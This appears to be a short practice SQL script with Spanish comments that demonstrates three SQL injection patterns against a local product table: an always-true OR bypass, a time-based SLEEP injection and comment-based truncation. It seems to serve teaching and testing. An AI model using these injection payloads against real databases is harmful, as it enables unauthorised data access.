   -- USE pruebas;
   -- SELECT COUNT(*) FROM myTable;
   -- SELECT * FROM myTable;

USE productosdb;

-- 1. Inyección para forzar la devolución de todos los datos (Bypass lógico)
SELECT * FROM productos WHERE nombre = '' OR '1'='1';

-- 2. Inyección basada en tiempo (Pausa la respuesta por 5 segundos)
SELECT * FROM productos WHERE id = 14 - SLEEP(1);

-- 3. Inyección mediante comentario (Anula las condiciones posteriores de la consulta)
SELECT * FROM productos WHERE nombre = 'Yuca'; -- ' AND precio = '12';